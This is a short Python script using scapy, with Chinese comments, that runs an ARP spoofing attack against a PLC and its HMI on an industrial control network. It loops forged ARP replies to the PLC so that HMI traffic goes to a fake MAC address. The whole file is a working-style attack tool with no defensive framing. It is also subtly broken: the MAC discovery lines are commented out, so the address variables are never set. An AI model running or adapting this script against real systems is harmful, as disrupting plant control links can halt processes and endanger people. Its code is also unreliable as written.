from scapy.all import *
import time

# 确保这些IP地址是正确的
plc_ip = "192.168.1.3"  # PLC的IP地址
hmi_ip = "192.168.1.4"  # HMI的IP地址

# 发送ARP请求以发现PLC和HMI的MAC地址
def discover_mac_addresses():
    global plc_mac, hmi_mac  # 使用global关键字声明plc_mac和hmi_mac变量
    # plc = sr1(ARP(pdst=plc_ip))  # 发送ARP请求到PLC的IP地址
    # plc_mac = plc.hwsrc  # 从响应中获取PLC的MAC地址
    # hmi = sr1(ARP(pdst=hmi_ip))  # 发送ARP请求到HMI的IP地址
    # hmi_mac = hmi.hwsrc  # 从响应中获取HMI的MAC地址
    print(f"PLC MAC: e0:dc:a0:36:b6:5c, HMI MAC: e0:dc:a0:30:63:52")

# 还原网络
def restore_network(plc_ip, hmi_ip, plc_mac, hmi_mac):
    try:
        send(ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=plc_mac), count=5)
        print("Network restored to original state.")
    except Exception as e:
        print(f"An error occurred while restoring the network: {e}")

# 发送ARP欺骗包
def arp_spoofing(plc_ip, hmi_ip, plc_mac, hmi_mac):
    try:
        while True:
            send(ARP(op=2, psrc=hmi_ip, hwsrc="ee:ee:ee:ee:ee:ee", hwdst=plc_mac, pdst=plc_ip), count=1)
            time.sleep(2)  # 发送间隔，可以根据需要调整
    except KeyboardInterrupt:
        print("ARP spoofing stopped by user.")
        restore_network(plc_ip, hmi_ip, plc_mac, hmi_mac)  # 恢复网络


# 首先发现PLC和HMI的MAC地址
discover_mac_addresses()

arp_spoofing(plc_ip, hmi_ip, plc_mac, hmi_mac)